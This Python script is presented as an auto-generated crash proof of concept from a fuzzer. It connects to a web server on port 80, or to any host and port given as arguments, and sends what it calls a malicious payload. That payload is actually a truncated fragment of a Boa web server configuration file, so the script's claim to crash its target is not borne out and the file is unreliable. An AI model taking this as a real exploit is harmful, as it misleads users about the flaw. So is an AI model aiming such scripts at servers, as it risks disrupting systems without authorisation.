#!/usr/bin/env python3
# AUTO-GENERATED POC BY RR-FUZZ trace_to_poc.py
# Target: 127.0.0.1:80

import socket
import sys
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

# The payload extracted from the crash trace
PAYLOAD = b's send to /dev/stderr\n# by the CGI. If this is commented out, it defaults to whatever \n# ErrorLog points.  Set to /dev/null to disable CGI stderr logging.\n# Please NOTE: Sending the logs to a pipe (\'|\'), as shown below,\n#  is somewhat experimental and might fail under heavy load.\n# "Usual libc implementations of printf will stall the whole\n#  process if the receiving end of a pipe stops reading."\n#CGILog  "|/usr/sbin/cronolog --symlink=/var/log/boa/cgi_log /var/log/boa/cgi-%Y%m%d.log"\n\n# CGIumask 027 (no mask for user, read-only for group, and nothing for user)\n# CGIumask 027\n# The CGIumask is set immediately before execution of the CGI.\n\n# UseLocaltime: Logical switch.  Uncomment to use localtime \n# instead of UTC time\n#UseLocaltime\n\n# VerboseCGILogs: this is just a logical switch.\n#  It simply notes the start and stop times of cgis in the error log\n# Comment out to disable.\n\n#VerboseCGILogs\n\n# ServerName: the name of this server that should be sent back to \n# clients if different than that returned by gethostname + gethostbyname \n\n#ServerName www.your.org.here\n#ServerName ""\n\n# VirtualHost: a logical switch.\n# Comment out to disable.\n# Given DocumentRoot /var/www, requests on interface \'A\' or IP \'IP-A\'\n# become /var/www/IP-A.\n# Example: http://localhost/ becomes /var/www/127.0.0.1\n#\n# Not used until version 0.93.17.2.  This "feature" also breaks commonlog\n# output rules, it prepends the interface number to each access_log line.\n# You are expected to fix that problem with a postprocessing script.\n\n#VirtualHost \n\n\n# VHostRoot: the root location for all virtually hosted data\n# Comment out to disable.\n# Incompatible with \'Virtualhost\' and \'DocumentRoot\'!!\n# Given VHostRoot /var/www, requests to host foo.bar.com,\n# where foo.bar.com is ip a.b.c.d,\n# become /var/www/a.b.c.d/foo.bar.com \n# Hostnames are "cleaned", and must conform to the rules\n# specified in rfc1034, which are be summarized here:\n# \n# Hostnames must start with a letter, end with a letter or digit, \n# and have as interior characters only letters, digits, and hyphen.\n# Hostnames must not exceed 63 characters in length.\n\n#VHostRoot /var/www\n\n# DefaultVHost\n# Define this in order to have a default hostname when the client does not\n# specify one, if using VirtualHostName. If not specified, the word\n# "default" will be used for compatibility with older clients.\n\n#DefaultVHost foo.bar.com\n\n# DocumentRoot: The root directory of the HTML documents.\n# Comment out to disable server non user files.\n\n#DocumentRoot /var/www\nDocumentRoot web\n#DocumentRoot /mnt\n# UserDir: The name of the directory which is appended onto a user\'s home\n# directory if a ~user request is received.\n\nUserDir public_html\n\n# DirectoryIndex: Name of the file to use as a pre-written HTML\n# directory index.  Please MAKE AND USE THESE FILES.  On the\n# fly creation of directory indexes can be _slow_.\n# Comment out to always use DirectoryMaker\n\nDirectoryIndex index.html\n\n# DirectoryMaker: Name of program used to create a directory listing.\n# Comment out to disable directory listings.  If both this and\n# DirectoryIndex are commented out, accessing a directory will give\n# an error (though accessing files in the directory are still ok).\n\n#DirectoryMaker /usr/lib/boa/boa_indexer\n\n# DirectoryCache: If DirectoryIndex doesn\'t exist, and DirectoryMaker\n# has been commented out, the the on-the-fly indexing of Boa can be used\n# to generate indexes of directories. Be warned that the output is \n# extremely minimal and can cause delays when slow disks are used.\n# Note: The DirectoryCache must be writable by the same user/group that \n# Boa runs as.\n\n#DirectoryCache /var/spool/boa/dircache\nDirectoryCache /tmp\n\n# KeepAliveMax: Number of KeepAlive requests to allow per connection\n# Comment out, or set to 0 to disable keepalive processing\n\n#KeepAliveMax 1000\nKeepAliveMax 0\n\n# KeepAliveTimeout: seconds to wait before keepalive connection times out\n\nKeepAliveTimeout 10\n\n# MimeTypes: This is the file that is used to generate mime type pairs\n# and Content-Type fields for boa.\n# Set to /dev/null if you do not want to load a mim'

def exploit():
    print(f"[*] Attacking {TARGET_IP}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((TARGET_IP, TARGET_PORT))
        
        print(f"[*] Sending {len(PAYLOAD)} bytes of malicious payload...")
        s.sendall(PAYLOAD)
        
        print("[+] Payload sent successfully.")
        
        # Optional: wait for a response
        try:
            resp = s.recv(4096)
            print("[*] Received response:")
            print(resp.decode('utf-8', errors='ignore'))
        except socket.timeout:
            print("[*] Socket timed out (This might mean the target crashed as expected!).")
            
        s.close()
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) == 3:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
    exploit()
